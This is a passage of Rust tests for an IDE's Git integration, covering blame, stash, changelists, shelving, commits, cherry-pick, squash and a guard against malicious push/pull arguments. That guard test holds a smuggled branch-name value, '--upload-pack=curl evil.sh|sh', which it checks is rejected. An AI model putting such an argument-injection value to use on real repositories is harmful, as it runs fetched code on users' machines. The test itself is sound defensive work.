        assert_eq!(diff.additions, 2, "合并 patch 只包含两个所选提交");
        assert!(
            !diff.lines.iter().any(|line| line.text.contains("gap")),
            "未选中的中间提交不能进入合并 diff"
        );

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn blame_reuses_cached_commit_metadata_for_repeated_hashes() {
        // 守住流式解析的缓存分支：porcelain 对同一提交只在首次出现时给完整
        // 元数据，之后只重复哈希头。原来这里靠「从当前位置向后重扫」拿
        // 作者/日期，改成单遍边走边结算后，重复哈希必须命中 cache 才拿得到
        // 正确的 author —— 否则第 1 行（与第 3/5 行同提交）会变成空作者。
        let base = std::env::temp_dir().join(format!("ide_blame_cache_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("r");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());
        let file = repo.join("f.txt");

        let commit_as = |msg: &'static str, name: &'static str| {
            vec![
                "-c".to_string(),
                "user.email=t@t.com".to_string(),
                "-c".to_string(),
                format!("user.name={}", name),
                "commit".to_string(),
                "-qm".to_string(),
                msg.to_string(),
            ]
        };

        // c1 写 5 行；c2 只改第 2、4 行 → blame 输出里 c1 的哈希出现 3 次，
        // 其中后两次不带任何元数据
        fs::write(&file, "a\nb\nc\nd\ne\n").unwrap();
        git(&repo, &["add", "."]);
        git(
            &repo,
            &commit_as("c1", "Alice")
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>(),
        );
        fs::write(&file, "a\nB\nc\nD\ne\n").unwrap();
        git(&repo, &["add", "."]);
        git(
            &repo,
            &commit_as("c2", "Bob")
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>(),
        );

        let blame = git_blame_impl(repo_arg, "f.txt".to_string()).unwrap();
        assert_eq!(blame.len(), 5, "应有 5 行 blame");
        for (idx, expected) in ["Alice", "Bob", "Alice", "Bob", "Alice"]
            .into_iter()
            .enumerate()
        {
            assert_eq!(
                blame[idx].author,
                expected,
                "第 {} 行作者应为 {}",
                idx + 1,
                expected
            );
            assert_eq!(blame[idx].line, idx as u32 + 1);
            assert!(!blame[idx].short_hash.is_empty());
        }
        // 同一提交的行必须拿到同一个 hash 与同一个 date
        assert_eq!(blame[0].hash, blame[2].hash);
        assert_eq!(blame[0].date, blame[2].date);
        assert_eq!(blame[1].hash, blame[3].hash);

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn blame_and_file_history_track_authors_and_dates() {
        let base = std::env::temp_dir().join(format!("ide_blame_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());
        let file = repo.join("code.rs");

        let commit_as = |msg: &'static str, name: &'static str| {
            vec![
                "-c".to_string(),
                "user.email=t@t.com".to_string(),
                "-c".to_string(),
                format!("user.name={}", name),
                "commit".to_string(),
                "-qm".to_string(),
                msg.to_string(),
            ]
        };

        // c1：alice 写两行
        fs::write(&file, "let a = 1;\nlet b = 2;\n").unwrap();
        git(&repo, &["add", "."]);
        git(
            &repo,
            &commit_as("c1", "Alice")
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>(),
        );

        // c2：bob 追加第三行
        fs::write(&file, "let a = 1;\nlet b = 2;\nlet c = 3;\n").unwrap();
        git(&repo, &["add", "."]);
        git(
            &repo,
            &commit_as("c2", "Bob")
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>(),
        );

        // blame：3 行，前两行 alice 的 c1，第三行 bob 的 c2
        let blame = git_blame_impl(repo_arg.clone(), "code.rs".to_string()).unwrap();
        assert_eq!(blame.len(), 3);
        assert_eq!(blame[0].line, 1);
        assert_eq!(blame[0].author, "Alice");
        assert_eq!(blame[0].short_hash.len(), 7);
        assert_eq!(blame[2].author, "Bob");
        assert_eq!(blame[2].line, 3);
        // 日期应被格式化为 YYYY-MM-DD
        assert!(blame[0].date.len() == 10 && blame[0].date.as_bytes()[4] == b'-');

        // 文件历史：两个提交，最新在前
        let history = git_file_history(repo_arg, "code.rs".to_string(), None).unwrap();
        assert_eq!(history.len(), 2);
        assert_eq!(history[0].message, "c2");
        assert_eq!(history[1].message, "c1");

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn format_unix_date_handles_epoch_and_modern() {
        assert_eq!(format_unix_date(0), "1970-01-01");
        assert_eq!(format_unix_date(86399), "1970-01-01");
        assert_eq!(format_unix_date(86400), "1970-01-02");
        assert_eq!(format_unix_date(1758153600), "2025-09-18");
    }

    /// push/pull 的 remote/branch 入口校验。恶意仓库可以建一个名字形如
    /// `--upload-pack=<cmd>` 的分支（check-ref-format 允许），用户在 IDE 里
    /// 选中它触发 push/pull 时，前导 `-` 的参数会被 git 当选项解析。
    mod push_pull_arg_guards {
        use super::*;

        #[test]
        fn leading_dash_is_rejected() {
            assert!(reject_option_like("origin").is_ok());
            assert!(reject_option_like("feature/x").is_ok());
            assert!(reject_option_like("--force").is_err());
            assert!(reject_option_like("-u").is_err());
            assert!(reject_option_like("--upload-pack=curl evil.sh|sh").is_err());
            // 前导空白也要拒：trim 后仍以 - 开头
            assert!(reject_option_like("  --tags").is_err());
        }

        #[test]
        fn refspec_shaped_branch_is_rejected() {
            // 完整 refspec 能把任意本地提交推到任意 ref，超出「推当前分支」语义
            assert!(reject_refspec_like("HEAD:refs/heads/main").is_err());
            assert!(reject_refspec_like("main:main").is_err());
            assert!(reject_refspec_like("refs/heads/*:refs/heads/*").is_err());
            // 普通分支名放行
            assert!(reject_refspec_like("main").is_ok());
            assert!(reject_refspec_like("feature/a-b_c.d").is_ok());
            assert!(reject_refspec_like("release/1.0").is_ok());
        }
    }
}

#[cfg(test)]
mod stash_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn read_file(path: &Path) -> String {
        fs::read_to_string(path).unwrap()
    }

    /// push（含未跟踪）→ list → files → apply 保留贮藏 → pop 清空 → drop
    #[test]
    fn stash_full_lifecycle() {
        let base = std::env::temp_dir().join(format!("ide_stash_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());

        let commit = vec![
            "-c",
            "user.email=t@t.com",
            "-c",
            "user.name=t",
            "commit",
            "-qm",
            "c1",
        ];
        fs::write(repo.join("a.txt"), "1\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &commit);

        let a_txt = repo.join("a.txt");
        let b_txt = repo.join("b.txt");

        // 修改 a.txt + 未跟踪 b.txt → 带消息贮藏（含未跟踪）
        fs::write(&a_txt, "2\n").unwrap();
        fs::write(&b_txt, "new\n").unwrap();
        let out =
            git_stash_push(repo_arg.clone(), Some("wip work".to_string()), Some(true)).unwrap();
        assert!(!out.contains("No local changes"));
        assert_eq!(read_file(&a_txt), "1\n", "贮藏后工作区应回到干净状态");
        assert!(!b_txt.exists(), "未跟踪文件应一并入贮藏");

        // list：一条，消息与分支解析正确
        let list = git_stash_list(repo_arg.clone()).unwrap();
        assert_eq!(list.len(), 1);
        assert!(list[0].message.contains("wip work"));
        assert_eq!(list[0].branch, "main");
        assert_eq!(list[0].index, 0);

        // files：a.txt 修改 + b.txt 新增
        let files = tauri::async_runtime::block_on(git_stash_files(
            repo_arg.clone(),
            "stash@{0}".to_string(),
        ))
        .unwrap();
        let paths: Vec<&str> = files.iter().map(|f| f.path.as_str()).collect();
        assert!(
            paths.contains(&"a.txt") && paths.contains(&"b.txt"),
            "应包含两个文件: {:?}",
            paths
        );

        // apply：恢复更改但保留贮藏
        git_stash_apply(repo_arg.clone(), "stash@{0}".to_string(), Some(false)).unwrap();
        assert_eq!(read_file(&a_txt), "2\n");
        assert!(b_txt.exists());
        assert_eq!(
            git_stash_list(repo_arg.clone()).unwrap().len(),
            1,
            "apply 后贮藏应保留"
        );

        // 清掉工作区改动后 pop：恢复且贮藏清空
        git(&repo, &["checkout", "--", "."]);
        fs::remove_file(&b_txt).unwrap();
        git_stash_apply(repo_arg.clone(), "stash@{0}".to_string(), Some(true)).unwrap();
        assert_eq!(read_file(&a_txt), "2\n");
        assert!(
            git_stash_list(repo_arg.clone()).unwrap().is_empty(),
            "pop 后贮藏应清空"
        );

        // 再建一个贮藏后 drop
        fs::write(&a_txt, "3\n").unwrap();
        git_stash_push(repo_arg.clone(), None, None).unwrap();
        assert_eq!(git_stash_list(repo_arg.clone()).unwrap().len(), 1);
        let dropped = git_stash_drop(repo_arg.clone(), "stash@{0}".to_string()).unwrap();
        assert!(dropped.contains("Dropped") || dropped.contains("stash@"));
        assert!(git_stash_list(repo_arg).unwrap().is_empty());

        let _ = fs::remove_dir_all(&base);
    }

    /// 无任何改动时 push 给出友好提示而不是错误
    #[test]
    fn stash_push_without_changes_is_not_an_error() {
        let base = std::env::temp_dir().join(format!("ide_stash_clean_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let commit = vec![
            "-c",
            "user.email=t@t.com",
            "-c",
            "user.name=t",
            "commit",
            "-qm",
            "c1",
        ];
        fs::write(repo.join("a.txt"), "1\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &commit);

        let out = git_stash_push(Some(repo.to_string_lossy().to_string()), None, None).unwrap();
        assert!(out.contains("No local changes"));
        assert!(git_stash_list(Some(repo.to_string_lossy().to_string()))
            .unwrap()
            .is_empty());

        let _ = fs::remove_dir_all(&base);
    }
}

#[cfg(test)]
mod add_and_decoration_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// git add 未跟踪文件后，status 应显示为已暂存的 A
    #[test]
    fn git_add_moves_untracked_to_staged() {
        let base = std::env::temp_dir().join(format!("ide_add_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());

        fs::write(repo.join("new.txt"), "1\n").unwrap();
        let status = git_status_impl(repo_arg.clone()).unwrap();
        assert!(status
            .iter()
            .any(|f| f.status == "U" && f.path == "new.txt"));

        git_add(repo_arg, vec!["new.txt".to_string()]).unwrap();
        let status = git_status_impl(Some(repo.to_string_lossy().to_string())).unwrap();
        let added = status
            .iter()
            .find(|f| f.path == "new.txt")
            .expect("add 后应仍出现在 status");
        assert_eq!(added.status, "A");
        assert!(added.is_staged);

        let _ = fs::remove_dir_all(&base);
    }

    /// "HEAD -> main" 装饰应拆成 HEAD 与 main 两个标签
    #[test]
    fn decoration_head_arrow_main_splits_into_two_tags() {
        let line =
            "abc123\tabc123\tdeveloper\ta@b.com\t1 hour ago\tmsg\txyz -> HEAD -> main\tdef456";
        let parsed = parse_git_log_output(line);
        assert_eq!(parsed.len(), 1);
        let tags = parsed[0].branch_tags.as_ref().unwrap();
        let names: Vec<&str> = tags.iter().map(|t| t.name.as_str()).collect();
        assert_eq!(names, vec!["xyz", "HEAD", "main"]);
        assert_eq!(tags[1].tag_type, "head");
        assert_eq!(tags[2].tag_type, "main");
    }
}

#[cfg(test)]
mod commit_flow_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn write(path: &Path, content: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    /// 未跟踪的新目录应被展开为具体文件：整目录未跟踪时 git 默认折叠成
    /// 「?? dir/」，前端会渲染出没有文件名的行（变更清单 bug）
    #[test]
    fn status_expands_untracked_directory_to_files() {
        let base = std::env::temp_dir().join(format!("ide_status_uall_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);

        write(&repo.join("a.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "c1",
            ],
        );

        // 整目录都是新的：fixtures/ 下放一个未跟踪文件
        write(&repo.join("tests/fixtures/data.bin"), "x\n");

        let status = git_status_impl(Some(repo.to_string_lossy().to_string())).unwrap();
        let entry = status
            .iter()
            .find(|f| f.path.contains("data.bin"))
            .expect("未跟踪文件应被展开为具体路径列出");
        assert_eq!(entry.path, "tests/fixtures/data.bin");
        assert_eq!(entry.status, "U");
        assert!(
            !status.iter().any(|f| f.path.ends_with('/')),
            "不应出现以斜杠结尾的目录条目: {:?}",
            status.iter().map(|f| &f.path).collect::<Vec<_>>()
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// changelist 生命周期：创建 → 指派 → 删除（rollback 模式还原文件内容；
    /// move 模式清除指派）。默认列表不可删除。
    #[test]
    fn changelist_create_assign_delete_lifecycle() {
        let base = std::env::temp_dir().join(format!("ide_changelist_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);

        write(&repo.join("a.txt"), "1\n");
        write(&repo.join("b.txt"), "2\n");
        git(&repo, &["add", "."]);
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "c1",
            ],
        );

        let repo_path = Some(repo.to_string_lossy().to_string());

        // 默认状态：仅 Changes
        let dto = tauri::async_runtime::block_on(changelists_load(repo_path.clone())).unwrap();
        assert_eq!(dto.lists, vec![DEFAULT_CHANGELIST.to_string()]);

        // 修改两个文件并指派到 work
        write(&repo.join("a.txt"), "1 modified\n");
        write(&repo.join("b.txt"), "2 modified\n");
        let dto = changelist_create(repo_path.clone(), "work".into()).unwrap();
        assert!(dto.lists.contains(&"work".to_string()));
        let dto = changelist_assign(
            repo_path.clone(),
            vec!["a.txt".into(), "b.txt".into()],
            "work".into(),
        )
        .unwrap();
        assert_eq!(dto.files.get("a.txt").map(String::as_str), Some("work"));

        // 默认列表不可删除
        assert!(changelist_delete(repo_path.clone(), DEFAULT_CHANGELIST.into(), false).is_err());

        // rollback 删除：文件内容还原、指派清除
        let dto = changelist_delete(repo_path.clone(), "work".into(), true).unwrap();
        assert!(!dto.lists.contains(&"work".to_string()));
        assert!(!dto.files.contains_key("a.txt"));
        let restored = fs::read_to_string(repo.join("a.txt")).unwrap();
        assert_eq!(restored, "1\n", "rollback 删除应还原文件内容");

        // move 删除：文件保留修改，但回到默认列表
        write(&repo.join("a.txt"), "1 modified\n");
        changelist_create(repo_path.clone(), "w2".into()).unwrap();
        changelist_assign(repo_path.clone(), vec!["a.txt".into()], "w2".into()).unwrap();
        let dto = changelist_delete(repo_path.clone(), "w2".into(), false).unwrap();
        assert!(!dto.lists.contains(&"w2".to_string()));
        assert_eq!(
            fs::read_to_string(repo.join("a.txt")).unwrap(),
            "1 modified\n"
        );
        assert_eq!(
            git_status_impl(repo_path.clone()).unwrap().len(),
            1,
            "文件修改应保留"
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// 多文件补丁应包含已跟踪修改与未跟踪新增；部分应用只命中 --include 的文件
    #[test]
    fn diff_patch_paths_and_partial_shelf_apply() {
        let base = std::env::temp_dir().join(format!("ide_shelve_multi_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);

        write(&repo.join("a.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "c1",
            ],
        );

        write(&repo.join("a.txt"), "1 modified\n");
        write(&repo.join("new.txt"), "brand new\n");

        let repo_path = Some(repo.to_string_lossy().to_string());
        let patch = git_diff_patch_paths(repo_path.clone(), vec!["a.txt".into(), "new.txt".into()])
            .unwrap();
        assert!(patch.contains("a.txt"), "补丁应包含已跟踪文件");
        assert!(
            patch.contains("new.txt"),
            "补丁应包含未跟踪文件的全新增差异"
        );

        git_shelve_save(repo_path.clone(), "multi".into(), patch).unwrap();
        let shelves = git_list_shelves(repo_path.clone()).unwrap();
        let shelf = shelves
            .iter()
            .find(|s| s.name == "multi")
            .expect("贮藏应存在");
        assert!(shelf.files.contains(&"new.txt".to_string()));

        // 还原工作区后，仅恢复 a.txt
        git_discard_file_changes(repo_path.clone(), "a.txt".into()).unwrap();
        git(&repo, &["clean", "-qfd"]);
        git_apply_shelf_partial(
            repo_path.clone(),
            "multi".into(),
            Some(vec!["a.txt".into()]),
        )
        .unwrap();
        assert_eq!(
            fs::read_to_string(repo.join("a.txt")).unwrap(),
            "1 modified\n"
        );
        assert!(
            !repo.join("new.txt").exists(),
            "未 include 的文件不应被应用"
        );

        // 再次还原后全量应用：a.txt 与 new.txt 都恢复
        git_discard_file_changes(repo_path.clone(), "a.txt".into()).unwrap();
        git_apply_shelf_partial(repo_path.clone(), "multi".into(), None).unwrap();
        assert_eq!(
            fs::read_to_string(repo.join("a.txt")).unwrap(),
            "1 modified\n"
        );
        assert_eq!(
            fs::read_to_string(repo.join("new.txt")).unwrap(),
            "brand new\n"
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// 审计 6.5 回归：`changelist_delete` 的 rollback 改为「一次 ls-tree 批量
    /// 判定 HEAD 成员」后语义必须不变 —— 已跟踪文件还原、未跟踪文件删除、
    /// 目录（无论是否在 HEAD 中）整体清理。
    #[test]
    fn changelist_delete_rollback_restores_tracked_and_drops_untracked() {
        let base = std::env::temp_dir().join(format!("ide_changelist_rb_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);

        write(&repo.join("a.txt"), "1\n");
        std::fs::create_dir_all(repo.join("sub")).unwrap();
        write(&repo.join("sub/c.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "c1",
            ],
        );

        // 工作区：两个已跟踪文件被改、未跟踪文件、未跟踪目录
        write(&repo.join("a.txt"), "2\n");
        write(&repo.join("sub/c.txt"), "2\n");
        write(&repo.join("new.txt"), "new\n");
        std::fs::create_dir_all(repo.join("undir")).unwrap();
        write(&repo.join("undir/x.txt"), "x\n");

        let repo_path = Some(repo.to_string_lossy().to_string());
        changelist_create(repo_path.clone(), "w1".into()).unwrap();
        changelist_assign(
            repo_path.clone(),
            vec![
                "a.txt".into(),
                "sub".into(),
                "new.txt".into(),
                "undir".into(),
            ],
            "w1".into(),
        )
        .unwrap();

        let dto = changelist_delete(repo_path.clone(), "w1".into(), true).unwrap();
        assert!(!dto.lists.contains(&"w1".to_string()));

        assert_eq!(
            fs::read_to_string(repo.join("a.txt")).unwrap(),
            "1\n",
            "已跟踪修改应还原"
        );
        assert_eq!(fs::read_to_string(repo.join("sub/c.txt")).unwrap(), "1\n");
        assert!(!repo.join("new.txt").exists(), "未跟踪文件应删除");
        assert!(!repo.join("undir").exists(), "未跟踪目录应整体清理");
        assert!(
            git_status_impl(repo_path.clone()).unwrap().is_empty(),
            "回滚后工作区应干净"
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// 全部提交（paths=None）：修改 + 未跟踪 + 删除都应被提交，之后工作区干净
    #[test]
    fn commit_all_stages_everything_including_untracked() {
        let base = std::env::temp_dir().join(format!("ide_commit_all_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());
        let commit_args = [
            "-c",
            "user.email=t@t.com",
            "-c",
            "user.name=t",
            "commit",
            "-qm",
            "c1",
        ];

        write(&repo.join("a.txt"), "1\n");
        write(&repo.join("b.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit_args);

        // 工作区：修改 a、未跟踪 c、删除 b
        write(&repo.join("a.txt"), "2\n");
        write(&repo.join("c.txt"), "new\n");
        fs::remove_file(repo.join("b.txt")).unwrap();

        git_commit(repo_arg.clone(), "优化".to_string(), false, None).unwrap();

        let status = git_status_impl(repo_arg).unwrap();
        assert!(status.is_empty(), "全部提交后工作区应干净，剩 {:?}", status);

        let _ = fs::remove_dir_all(&base);
    }

    /// 部分提交：勾选中的未跟踪文件一并提交；未勾选的修改保持原样
    #[test]
    fn partial_commit_includes_untracked_and_isolates_others() {
        let base = std::env::temp_dir().join(format!("ide_commit_part_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());

        write(&repo.join("a.txt"), "1\n");
        write(&repo.join("b.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "c1",
            ],
        );

        write(&repo.join("a.txt"), "2\n");
        write(&repo.join("b.txt"), "2\n");
        write(&repo.join("new.txt"), "new\n");

        // 只提交 a.txt 和未跟踪的 new.txt
        git_commit(
            repo_arg.clone(),
            "优化".to_string(),
            false,
            Some(vec!["a.txt".to_string(), "new.txt".to_string()]),
        )
        .unwrap();

        let status = git_status_impl(repo_arg).unwrap();
        let b_status = status
            .iter()
            .find(|f| f.path == "b.txt")
            .expect("b.txt 仍应处于修改状态");
        assert_eq!(b_status.status, "M");
        assert!(
            !status
                .iter()
                .any(|f| f.path == "new.txt" || f.path == "a.txt"),
            "已提交文件不应残留"
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// 回归：cherry-pick 冲突解决后从提交面板提交，不能走 `commit --only`：
    /// Git 会报 "cannot do a partial commit during a cherry-pick"。
    #[test]
    fn commit_during_cherry_pick_commits_the_index_and_finishes_it() {
        let base = std::env::temp_dir().join(format!("ide_commit_cherry_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());
        write(&repo.join("f.txt"), "base\n");
        git(&repo, &["add", "."]);
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "base",
            ],
        );

        git(&repo, &["checkout", "-qb", "feat"]);
        write(&repo.join("f.txt"), "feat\n");
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qam",
                "feat",
            ],
        );
        git(&repo, &["checkout", "-q", "main"]);
        write(&repo.join("f.txt"), "main\n");
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qam",
                "main",
            ],
        );

        let mut cherry = git_cmd();
        cherry.arg("-C").arg(&repo).args(["cherry-pick", "feat"]);
        let cherry_out = git_output(&mut cherry).unwrap();
        assert!(
            !cherry_out.status.success(),
            "f.txt 应产生 cherry-pick 冲突"
        );
        assert!(repo.join(".git/CHERRY_PICK_HEAD").exists());

        write(&repo.join("f.txt"), "resolved\n");
        git(&repo, &["add", "f.txt"]);

        // 勾选文件提交：旧实现传 paths，会触发 partial commit 错误。
        git_commit(
            repo_arg,
            "resolved message".to_string(),
            false,
            Some(vec!["f.txt".to_string()]),
        )
        .unwrap();

        assert!(
            !repo.join(".git/CHERRY_PICK_HEAD").exists(),
            "cherry-pick 应已完成"
        );
        let mut log = git_cmd();
        log.arg("-C").arg(&repo).args(["log", "-1", "--pretty=%s"]);
        let log_out = git_output(&mut log).unwrap();
        assert_eq!(
            String::from_utf8_lossy(&log_out.stdout).trim(),
            "resolved message"
        );

        let _ = fs::remove_dir_all(&base);
    }
}

#[cfg(test)]
mod menu_action_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn head_hash(dir: &Path) -> String {
        let out = git_output(git_cmd().arg("-C").arg(dir).args(["rev-parse", "HEAD"])).unwrap();
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    }

    fn write(path: &Path, content: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    fn setup_repo(name: &str) -> (std::path::PathBuf, std::path::PathBuf, Option<String>) {
        // rebase/amend 产生的提交需要作者身份：写入仓库级配置（不污染并行测试的进程环境）
        let base = std::env::temp_dir().join(format!("{}_{}", name, std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        git(&repo, &["config", "user.name", "t"]);
        git(&repo, &["config", "user.email", "t@t.com"]);
        let repo_arg = Some(repo.to_string_lossy().to_string());
        (base, repo, repo_arg)
    }

    /// amend 改信息 / drop 摘除非 HEAD 提交 / get-from-revision 恢复旧版本 / patch 文本
    #[test]
    fn amend_message_drop_commit_and_revision_checkout() {
        let (base, repo, repo_arg) = setup_repo("ide_menu_act");
        let commit = |msg: &'static str| {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        write(&repo.join("a.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("c1"));
        let c1 = head_hash(&repo);
        write(&repo.join("a.txt"), "2\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("c2"));
        let c2 = head_hash(&repo);
        write(&repo.join("b.txt"), "x\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("c3"));

        // amend HEAD 信息
        git_amend_message(repo_arg.clone(), "c3-renamed".to_string()).unwrap();
        let log = git_log_impl(repo_arg.clone(), Some(1), None, None, None, None).unwrap();
        assert_eq!(log[0].message, "c3-renamed");
        // HEAD 哈希变化但父仍是 c2
        let new_head = head_hash(&repo);
        assert_ne!(new_head, c2);

        // drop c2（非 HEAD）：rebase --onto 摘除
        git_drop_commit(repo_arg.clone(), c2.clone(), None).unwrap();
        let log = git_log_impl(repo_arg.clone(), Some(5), None, None, None, None).unwrap();
        assert!(!log.iter().any(|c| c.message == "c2"), "c2 应被摘除");
        assert!(
            log.iter().any(|c| c.message == "c1") && log.iter().any(|c| c.message == "c3-renamed")
        );
        // b.txt 仍存在（c3 重放保留）
        assert!(repo.join("b.txt").exists());

        // get from revision：把 a.txt 恢复成 c1 版本
        git_checkout_file_revision(repo_arg.clone(), c1.clone(), "a.txt".to_string()).unwrap();
        assert_eq!(fs::read_to_string(repo.join("a.txt")).unwrap(), "1\n");

        // patch 文本包含提交信息头
        let patch = git_commit_patch(repo_arg.clone(), c1).unwrap();
        assert!(patch.contains("c1") && patch.contains("diff --git"));
        let local_patch = git_diff_patch(repo_arg.clone(), None, None).unwrap();
        let _ = local_patch; // 工作区干净时为空文本，仅验证调用不报错

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn squash_commits_rebase() {
        let (base, repo, repo_arg) = setup_repo("squash_test");
        let commit = |msg: &'static str| {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        write(&repo.join("f1.txt"), "1\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("commit 1"));
        let c1 = head_hash(&repo);

        write(&repo.join("f2.txt"), "2\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("commit 2"));
        let c2 = head_hash(&repo);

        write(&repo.join("f3.txt"), "3\n");
        git(&repo, &["add", "."]);
        git(&repo, &commit("commit 3"));
        let c3 = head_hash(&repo);

        // 压缩 c2 和 c3
        git_squash_commits(
            repo_arg.clone(),
            vec![c2, c3],
            "squashed 2 and 3\n\nall in one".to_string(),
        )
        .unwrap();

        let log = git_log_impl(repo_arg.clone(), Some(10), None, None, None, None).unwrap();
        assert_eq!(log.len(), 2, "压缩后应该剩下 2 个提交");
        assert_eq!(log[0].message, "squashed 2 and 3");
        assert_eq!(log[1].message, "commit 1");
